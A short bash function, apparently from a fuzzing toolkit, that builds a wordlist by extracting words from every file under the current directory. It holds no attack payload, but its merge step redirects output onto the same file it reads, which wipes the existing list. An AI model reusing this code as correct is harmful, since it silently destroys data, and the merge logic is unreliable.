cttx_wordlist() {
    # Create or updates a contextual wordlist to be used for fuzzing. min 4 chars 
    local wordlist="ContextWordlist.txt" 
    local temp_wordlist="temp_wordlist.txt"
 
    # Extract new words from files 
    find . -type f -print0 | xargs -0 cat 2>/dev/null | tr -cs '[:alpha:]' '\n' | awk 'length > 3' | sort -u > "$temp_wordlist"
 
    # Merge with existing list if it exists
    if [[ -f "$wordlist" ]]; then
        cat "$wordlist" "$temp_wordlist" | sort -u > "$wordlist" 
        rm -f "$temp_wordlist" 
    else 
        mv "$temp_wordlist" "$wordlist"
    fi 
 
    echo "Wordlist updated at: $(realpath "$wordlist")"
 
